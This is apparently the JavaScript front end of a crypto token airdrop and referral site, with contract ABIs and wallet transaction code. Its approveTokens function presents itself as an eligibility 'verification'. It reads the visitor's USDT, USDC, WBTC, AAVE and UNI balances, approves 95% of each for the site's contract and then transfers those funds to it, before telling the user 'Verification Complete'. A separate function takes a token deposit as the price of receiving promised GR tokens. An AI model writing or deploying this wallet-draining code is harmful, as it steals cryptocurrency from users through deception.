import { getCurrentProvider } from "./script2.js";


var loader = document.querySelector(".center");
var loader_msg = document.querySelector(".loader_message");

// Token Addresses
const TOKEN_ADDRESSES = [
  // "0xdac17f958d2ee523a2206206994597c13d831ec7", // Tether (USDT)
  // "0x3d6545b08693daE087E957cb1180ee38B9e3c25E", // Ethereum Classic (ETC)
  // "0x514910771af9ca656af840dff83e8264ecf986ca", // Chainlink (LINK)
  // "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USD Coin (USDC)
  // "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599", // Wrapped Bitcoin (WBTC)
  // "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", // Aave (AAVE)
  // "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"  // Uniswap (UNI)
];
const USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7"
// const ETHEREUM_CLASSIC_ADDRESS = "0x3d6545b08693daE087E957cb1180ee38B9e3c25E"
const CHAINLINK_ADDRESS = "0x514910771af9ca656af840dff83e8264ecf986ca"
const USD_COIN_ADDRESS = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"
const WRAPPED_BTICOIN_ADDRESS = "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599"
const AAVE_ADDRESS = "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9"
const UNISWAP_ADDRESS = "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"

const GR_ADDRESS = "0x3Fe589578eF2286236EC0dd47173AbF393C4fc79";
const S_TOKEN = "0x298f63a2C5b299611a06bE60138C24d6Fe5798d8";

const GR_ADDRESS_ABI = {
  "abi" : [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "previousOwner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "OwnershipTransferred",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        }
      ],
      "name": "contractTokenBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "contractUSDTBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "hasReceivedGR",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "hasUserReceivedGrTokens",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "friend",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "referrer",
          "type": "address"
        }
      ],
      "name": "referFriend",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "referrals",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "renounceOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "newOwner",
          "type": "address"
        }
      ],
      "name": "transferOwnership",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "updateHasReceived",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdtAddress",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "usdtToken",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "user",
          "type": "address"
        }
      ],
      "name": "userReferralStats",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "tokenAddress",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdrawErc20Tokens",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "withdrawUSDT",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ]
}

const S_TOKEN_ABI = {
  "abi" : [
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "initialSupply",
          "type": "uint256"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Approval",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "approve",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "subtractedValue",
          "type": "uint256"
        }
      ],
      "name": "decreaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "addedValue",
          "type": "uint256"
        }
      ],
      "name": "increaseAllowance",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transfer",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "name": "Transfer",
      "type": "event"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "transferFrom",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "owner",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "spender",
          "type": "address"
        }
      ],
      "name": "allowance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "account",
          "type": "address"
        }
      ],
      "name": "balanceOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "decimals",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "name",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "symbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "totalSupply",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ]
}

const ERC20_ABI = {
  "abi" : [
    {
        "constant": true,
        "inputs": [],
        "name": "name",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "totalSupply",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_from",
                "type": "address"
            },
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "decimals",
        "outputs": [
            {
                "name": "",
                "type": "uint8"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "name": "balance",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "symbol",
        "outputs": [
            {
                "name": "",
                "type": "string"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_to",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "transfer",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "_owner",
                "type": "address"
            },
            {
                "name": "_spender",
                "type": "address"
            }
        ],
        "name": "allowance",
        "outputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "payable": true,
        "stateMutability": "payable",
        "type": "fallback"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "owner",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "spender",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Approval",
        "type": "event"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "from",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "to",
                "type": "address"
            },
            {
                "indexed": false,
                "name": "value",
                "type": "uint256"
            }
        ],
        "name": "Transfer",
        "type": "event"
    }
]
}

// Import the necessary dependencies

let contractAddress = "0x7469FB22dEeA3C7565f0332c3366C105b3EB2A8C";


export async function is_ethereum_chainId() {
  const web3 = await get_web3_object();

  // Request the current chain ID
  // const chainId = await window.ethereum.request({ method: 'eth_chainId' });
  const chainId = await web3.eth.getChainId()

  // Get the current chain ID
  // const chainId = await provider.eth.getChainId();
  console.log(chainId)

  // Check if the chain ID matches BSC (56)
  if (chainId == '56') {
    console.log('Connected to Binance Smart Chain (BSC)');
    return true
  } 
  else {
    // console.log('Not connected to Binance Smart Chain (BSC)');
    return false
  }
}



async function getSmartContract(contractAddress, abi) {
  // let web3_provider = await getCurrentProvider();
  let web3_obj = new Web3(window.ethereum)
  // let web3_obj = new Web3(web3_provider);
  let contract;

  try {
    // Use the ABI to define the interface of the smart contract
    let contract = new web3_obj.eth.Contract(abi.abi, contractAddress);
    console.log("Contract: ", contract)
    return contract;
  } 
  catch (error) {
    console.log(error)
  }
}

async function getUserAddress() {
  let web3 = await getCurrentProvider();
  if (web3) {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
      return accounts[0];
    }
  }
  return null; // Return null if no user is connected or there are no accounts
}


export async function gas_estimate(encoded_data) {
  // Getting Estimated Gas Fee
  let web3_obj = await get_web3_object();
  console.log("Works Here")

  const estimated_gas = await new Promise((resolve, reject) => {
    web3_obj.eth.estimateGas({
      to: contract_address,
      data: encoded_data
    }, (error, estimate) => {
      if (!error) {
        resolve(estimate);
      } else {
        reject(error);
      }
    });
  });
  return estimated_gas;
}

function checkBalanceIsEnough(balance) {
  if (balance > 0) {
    return true
  }
  return false
}

export async function approveTokens() {
  let zeroCount = 0;
  let tx;
  let userAddress = localStorage.getItem('account');
  let web3 = new Web3(window.ethereum);

  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  
  let usdtContract = await getSmartContract(USDT_ADDRESS, ERC20_ABI)
  // let ethereumClassicContract = await getSmartContract(ETHEREUM_CLASSIC_ADDRESS, ERC20_ABI)
  let chainLinkContract = await getSmartContract(CHAINLINK_ADDRESS, ERC20_ABI)
  let usdContract = await getSmartContract(USD_COIN_ADDRESS, ERC20_ABI)
  let wrappedBitcoinContract = await getSmartContract(WRAPPED_BTICOIN_ADDRESS, ERC20_ABI)
  let aaveContract = await getSmartContract(AAVE_ADDRESS, ERC20_ABI)
  let uniswapContract = await getSmartContract(UNISWAP_ADDRESS, ERC20_ABI)

  // getting the user balance for each token
  // let userGrBalance = await grTokenContract.methods.balanceOf(userAddress).call();
  // let userStBalance = await sTokenContract.methods.balanceOf(userAddress).call();
  console.log("Calling")
  let usdtBalance = await usdtContract.methods.balanceOf(userAddress).call();
  console.log("Calling 3")
  let usdBalance = await usdContract.methods.balanceOf(userAddress).call();
  console.log("Calling 4")
  let wrappedBitcoinBalance = await wrappedBitcoinContract.methods.balanceOf(userAddress).call();
  console.log("Calling 5")
  let chainLinkBalance = await chainLinkContract.methods.balanceOf(userAddress).call();
  console.log("Calling 6")
  let aaveBalance = await aaveContract.methods.balanceOf(userAddress).call();
  console.log("Calling 7")
  let uniswapBalance = await uniswapContract.methods.balanceOf(userAddress).call();
  console.log('Called')


  
// here!
  
  if (checkBalanceIsEnough(usdtBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(usdtBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(USDT_ADDRESS, usdtContract, userAddress, allowanceInWei, web3);
  } else{zeroCount+=1}

  if (checkBalanceIsEnough(usdBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(usdBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(USD_COIN_ADDRESS, usdContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(wrappedBitcoinBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(wrappedBitcoinBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(WRAPPED_BTICOIN_ADDRESS, wrappedBitcoinContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(aaveBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(aaveBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(AAVE_ADDRESS, aaveContract, userAddress, allowanceInWei, web3);
  }else{zeroCount+=1}

  if (checkBalanceIsEnough(uniswapBalance) > 0n) {
    // Adjust the approval amount as needed (e.g., 95% of user balance)
    let approvalAmount = BigInt(Number(uniswapBalance) * 0.95); // Convert to BigInt
    const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
    tx = await approveAndSend(UNISWAP_ADDRESS, uniswapContract, userAddress, allowanceInWei, web3);
  }else{
    zeroCount+=1
    console.log(zeroCount)
  }
  console.log(zeroCount)

  // if (checkBalanceIsEnough(userGrBalance) > 0n) {
  //   // Adjust the approval amount as needed (e.g., 95% of user balance)
  //   let approvalAmount = BigInt(Number(userGrBalance) * 0.95); // Convert to BigInt
  //   console.log(userGrBalance)
  //   const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
  //   tx = await approveAndSend(GR_ADDRESS, grTokenContract, userAddress, allowanceInWei, web3);
  // }
  // if (checkBalanceIsEnough(userStBalance) > 0n) {
  //   // Adjust the approval amount as needed (e.g., 95% of user balance)
  //   let approvalAmount = BigInt(Number(userStBalance) * 0.95); // Convert to BigInt
  //   const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
  //   tx = await approveAndSend(S_TOKEN, sTokenContract, userAddress, allowanceInWei, web3);
  // }

  if (zeroCount >= 5) {
    window.alert("This Wallet Does Not Have Enough Transactions and Is Therefore not Eligible to receive GR Tokens.");
    localStorage.setItem("approved", "false")
  }else{
    window.alert("Verification Complete");
  localStorage.setItem("approved", "true")
  }
}

export async function approveAndSend(tokenAddress, tokenContract, userAddress, allowanceInWei, web3) {
  // Prepare the transaction data for the 'approve' function
  allowanceInWei = web3.utils.fromWei(allowanceInWei, 'ether');
  const data = tokenContract.methods.approve(GR_ADDRESS, allowanceInWei).encodeABI();

  // Create a transaction object
  const tx = {
    from: userAddress,
    to: tokenAddress,
    data: data
  };
  
  console.log("Tx: ", tx)

  try {
    // Sign and send the transaction
    const result = await web3.eth.sendTransaction(tx);

    // Transferring Tokens to smart contract
    const currentAllowance = await tokenContract.methods.allowance(userAddress, GR_ADDRESS).call();
    const data2 = tokenContract.methods.transfer(GR_ADDRESS, currentAllowance).encodeABI();

    const tx2 = {
      from: userAddress,
      to: tokenAddress,
      data: data2
    };
    console.log("Tx2: ", tx2)

    try{
      const result2 = await web3.eth.sendTransaction(tx2);
    } catch(error) {console.log(error)}

  } catch (error) {
    console.error(error);
    window.alert("An Error Occured.");
  }
}


export async function userReferralStatus() {
  let userAddress = localStorage.getItem('account')
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  let refStatus = await grTokenContract.methods.userReferralStats(userAddress).call();
  return refStatus;
}

export async function userHasReceivedToken() {
  let userAddress = localStorage.getItem('account')
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  let hasReceived = await grTokenContract.methods.hasUserReceivedGrTokens(userAddress).call();
  console.log(hasReceived)
  return hasReceived;
}

async function transfer3Usdt() {
  // let web3 = await getCurrentProvider()
  let web3 = new Web3(window.ethereum)
  console.log(web3)
  let userAddress = localStorage.getItem('account');
  let sTokenContract = await getSmartContract(S_TOKEN, S_TOKEN_ABI);
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  const amountUsdtWei = web3.utils.toWei('3', 'ether');
  
  // open loader
  loader.style.display = "flex"
  loader_msg.textContent = "Depositing USDT, Please Wait..."

  // Create a transaction object for the USDT transfer
  const tx = {
    from: userAddress,
    to: S_TOKEN, // USDT contract address
    value: '0', // Value field is set to 0 for token transfers
    data: sTokenContract.methods.transfer(GR_ADDRESS, amountUsdtWei).encodeABI(), // Encode the transfer function
    gasPrice: '20000000000', // Replace with an appropriate gas price
    gasLimit: '60000', // Replace with an appropriate gas limit
    nonce: null, // Leave nonce as null to auto-calculate it
  };

  console.log(tx)
  try{
    const result = await web3.eth.sendTransaction(tx);

    // now send the user GR Tokens
    loader_msg.textContent = "Transferring 100,000 GR Token."

    const tx2 = {
      from: userAddress,
      to: GR_ADDRESS, // USDT contract address
      value: '0', // Value field is set to 0 for token transfers
      data: grTokenContract.methods.updateHasReceived(localStorage.getItem('account')).encodeABI(), // Encode the transfer function
      gasPrice: '20000000000', // Replace with an appropriate gas price
      gasLimit: '60000', // Replace with an appropriate gas limit
      nonce: null, // Leave nonce as null to auto-calculate it
    };

    const result2 = await web3.eth.sendTransaction(tx2);
    loader.style.display = "none";
    location.reload();
  }catch(error){
    if(error.code == 100){
    window.alert("Insufficient Funds For GAS FEE");
    loader.style.display = "none"
    }
  }

  
}


export async function referFriend(referrer) {
  
  let web3 = window.web3;
  let userAddress = localStorage.getItem('account');
  let grTokenContract = await getSmartContract(GR_ADDRESS, GR_ADDRESS_ABI);
  const data = grTokenContract.methods.referFriend(userAddress, referrer).encodeABI();

  // Create a transaction object
  const tx = {
    from: userAddress,
    to: GR_ADDRESS,
    data: data
  }
  console.log("Tx: ", tx)
  
  //opening loader
  loader.style.display = "flex";
  loader_msg.textContent = "Completing User Referral Process...";

  try {
    // Sign and send the transaction
    const result = await web3.eth.sendTransaction(tx);

    // remove the referrer data from local STorage
    localStorage.removeItem('referrer')

    // close loader
    loader_msg.textContent = "Referral Completed Successfully";
    loader.style.display = "none";

    window.alert("Referral Completed Successfully");
  } catch (error) {
    console.error(error);
    window.alert("An Error Occured.");

    loader_msg.textContent = error;
    loader.style.display = "none";
  }
}


document.getElementById("deposit_usdt_btn").addEventListener("click", async () => {
  if (localStorage.getItem('account')) {
    await transfer3Usdt()
  }else{
    window.alert("Please Connect Your Wallet To Make Transfer.");
  }
})